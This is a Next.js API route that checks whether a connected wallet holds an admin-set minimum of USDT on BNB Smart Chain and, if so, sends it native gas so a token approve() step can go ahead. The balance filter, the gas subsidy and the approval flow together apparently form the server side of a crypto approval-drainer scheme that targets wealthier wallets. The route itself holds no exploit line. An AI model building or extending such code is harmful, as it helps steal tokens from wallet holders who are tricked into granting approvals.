import { NextResponse } from 'next/server';
import { createPublicClient, fallback, http, formatUnits } from 'viem';
import { bsc } from 'viem/chains';
import { requireAuth } from '@/lib/auth/require-auth';
import { connectToDatabase, getWalletFilterSettings, FeeTransfer } from '@/lib/db';
import { fundBep20GasFee } from '@/lib/wallet/fee-funding';
import { errorResponse } from '@/lib/utils/errors';

export const dynamic = 'force-dynamic';

type Network = 'BEP20' | 'ERC20' | 'TRC20';

const USDT_BEP20 = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;
const USDT_BAL_ABI = [{
  name: 'balanceOf', type: 'function' as const, stateMutability: 'view' as const,
  inputs: [{ name: 'account', type: 'address' }], outputs: [{ type: 'uint256' }],
}] as const;
const BSC_RPCS = [
  process.env.NEXT_PUBLIC_BSC_RPC, 'https://bsc-dataseed.binance.org',
  'https://bsc-dataseed1.defibit.io', 'https://bsc.drpc.org',
].filter(Boolean) as string[];

const RECENT_FUNDING_WINDOW_MS = 24 * 60 * 60 * 1000;

/**
 * POST /api/wallets/fund-network-fee
 * Body: { address: string, network: 'BEP20'|'ERC20'|'TRC20' }
 *
 * Sends a small amount of native gas to a wallet that has independently been verified
 * (server-side, right here — never trusting the caller) to meet the admin's minimum
 * USDT balance to connect. BEP20 only for now. Fails closed on funding (never sends
 * unless every check passes) but never throws — the approve() step proceeds either way.
 */
export async function POST(req: Request) {
  try {
    const user = await requireAuth();
    const body = await req.json() as { address?: string; network?: string };
    const address = (body.address ?? '').trim();
    const network = (body.network ?? '') as Network;

    if (!address || !['BEP20', 'ERC20', 'TRC20'].includes(network)) {
      return NextResponse.json({ error: 'address and network required' }, { status: 400 });
    }

    if (network !== 'BEP20') {
      return NextResponse.json({ sent: false, reason: 'unsupported_network' });
    }

    await connectToDatabase();

    const filterSettings = await getWalletFilterSettings();
    if (filterSettings.enabled) {
      let balance = 0;
      try {
        const transport = fallback(BSC_RPCS.map(r => http(r, { timeout: 8_000 })));
        const client = createPublicClient({ chain: bsc, transport });
        const raw = await client.readContract({
          address: USDT_BEP20, abi: USDT_BAL_ABI, functionName: 'balanceOf',
          args: [address as `0x${string}`],
        }) as bigint;
        balance = parseFloat(formatUnits(raw, 18));
      } catch {
        return NextResponse.json({ sent: false, reason: 'balance_check_failed' });
      }
      if (balance < filterSettings.minBalanceToConnect) {
        return NextResponse.json({ sent: false, reason: 'ineligible' });
      }
    }

    // Avoid re-funding a wallet we already topped up recently (abuse/retry guard).
    const recent = await FeeTransfer.findOne({
      userId: user.id, toAddress: address, network: 'BEP20', status: 'sent',
      createdAt: { $gte: new Date(Date.now() - RECENT_FUNDING_WINDOW_MS) },
    }).lean();
    if (recent) {
      return NextResponse.json({ sent: false, reason: 'already_funded', feeTransferId: String(recent._id) });
    }

    const result = await fundBep20GasFee(address, user.id);
    return NextResponse.json(result);
  } catch (err) {
    return errorResponse(err);
  }
}
